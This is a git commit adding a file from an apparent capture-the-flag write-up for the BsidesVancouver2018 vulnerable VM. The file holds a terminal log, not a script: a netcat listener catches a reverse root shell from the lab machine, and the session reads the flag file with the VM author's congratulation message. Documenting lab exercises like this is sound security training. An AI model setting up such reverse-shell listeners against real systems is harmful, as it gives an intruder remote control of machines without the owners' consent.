77b3a3c413e5a47008f77026118ab75b58e87e75
MMammadli <mmemmedli676@gmail.com>
2026-03-27 14:09:24 -0400

    Create root-access.sh

---
+++ BsidesVancouver2018/Privilege-Escalation/root-access.sh
@@ -0,0 +1,17 @@
+nc -lvnp 1111        
+listening on [any] 1111 ...
+connect to [192.168.100.4] from (UNKNOWN) [192.168.100.12] 60385
+sh: 0: can't access tty; job control turned off
+# ls
+flag.txt
+# cat flag.txt
+Congratulations!
+
+If you can read this, that means you were able to obtain root permissions on this VM.
+You should be proud!
+
+There are multiple ways to gain access remotely, as well as for privilege escalation.
+Did you find them all?
+
+@abatchy17
+
